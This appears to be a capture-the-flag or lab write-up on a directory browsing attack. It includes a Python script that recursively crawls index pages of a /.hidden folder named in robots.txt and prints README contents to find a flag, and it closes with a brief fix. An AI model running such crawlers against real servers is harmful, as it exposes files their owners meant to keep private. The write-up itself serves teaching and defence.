# Directory browsing attack

### Introduction
Directory browsing involves trying to access and read files that are stored in directories on a web server.

### Procedure
After reading `robots.txt`, we can notice that this file contains `Disallow: /.hidden` to notify crowlers to not read from this directory. This method, doesn't prevent us from scraping content from this directory so we are going to write a script in python that will display content from every file in that folder.

### Program
First things first, we start by writing a function that will return us the content of a file in the server.
```` python
def try_robots(path: str = ""):
	url = f'http://192.168.56.101/.hidden{path}'

	response = requests.get(url)

	return response.text
````

Then, we are going to use that function to get the content in each index page, which will inform us about directories and files in directory we are checking. We will then parse the index into a list of directories and files.
``` python
def filter_index(path: str = "/"):
	text = try_robots(path)

	lines = text.split('\n')

	links = [x for x in lines if x.startswith('<a href=')]
	links.reverse()

	for link in links:
		if type(link) == str:
			start_index = link.find('"') + 1
			end_index = link.find('"', start_index + 1)
			if start_index != -1 and end_index != -1:
				file = link[start_index:end_index]
				new_path = path + file
				if file != "README":
					filter_index(new_path)
				else:
					text = try_robots(new_path)
					print(f"[{new_path}]: ", text)
					if len(text) > 40:
						exit()
```

If a value of that list is `README`, we will get its content using `try_robots()` function of earlier and if it contains more than 40 characters we will know that it contains the flag we are looking for.

### How to fix
In order to fix this, it is recommended to prevent the access to this directory and not just disabling it on robots.txt.